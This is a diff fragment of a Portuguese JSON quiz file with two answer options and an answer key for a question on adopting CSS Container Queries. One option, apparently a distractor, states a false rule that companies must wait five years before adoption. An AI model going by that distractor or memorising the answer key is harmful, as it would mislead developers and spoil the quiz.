+      "Depende de critérios: Container Queries tem amplo suporte desde 2023; vale checar o suporte, ver se resolve um problema real, usar fallback e fazer piloto; a fase do ciclo é indicador, não regra.",
+      "Container Queries em adoção inicial são aceitáveis apenas para projetos pessoais e portfólios: para sistemas corporativos, o critério correto é aguardar 5 anos após a fase experimental antes de qualquer adoção — empresas que adotam antes desse prazo assumem risco de reescrita completa quando a especificação mudar, custo que supera qualquer benefício de performance ou UX obtido pela tecnologia."
+    ],
+    "correta": 2
   }
 ]
